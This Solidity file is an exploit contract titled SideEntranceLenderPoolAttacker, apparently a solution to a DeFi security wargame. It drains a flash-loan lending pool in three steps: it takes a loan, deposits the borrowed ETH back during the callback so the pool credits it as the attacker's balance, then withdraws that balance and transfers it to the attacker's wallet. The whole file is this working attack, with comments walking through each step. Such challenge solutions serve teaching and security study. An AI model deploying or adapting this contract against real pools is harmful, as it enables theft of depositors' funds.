// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";

/**
 * @title SideEntranceLenderPoolAttacker
 * @author kootsZhin
 */
contract SideEntranceLenderPoolAttacker {

    using Address for address;

    // during the flash loan execution, deposit back the amount we borrowed
    function execute() external payable {
        msg.sender.functionCallWithValue(
            abi.encodeWithSignature(
                "deposit()"
            ),
            msg.value
        );
    }

    function attack(address pool, uint256 amount) external {

        // call the flash loan here and call execute() in the function call
        pool.functionCall(
            abi.encodeWithSignature(
                "flashLoan(uint256)", 
                amount
            )
        );

        // withdraw the amount we "have" in the flash loan contract
        pool.functionCall(
            abi.encodeWithSignature(
                "withdraw()"
            )
        );

        // transfer the amount to the attacker's wallet
        payable(msg.sender).transfer(amount);
    }

    // allow receiving ETH
    receive() external payable {}
}